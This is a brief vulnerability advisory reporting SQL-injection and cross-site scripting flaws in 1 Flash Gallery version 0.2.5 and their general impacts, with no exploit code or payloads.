1 Flash Gallery is prone to an SQL-injection vulnerability and a cross-site scripting vulnerability.

Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

1 Flash Gallery 0.2.5 is vulnerable; other versions may also be affected.
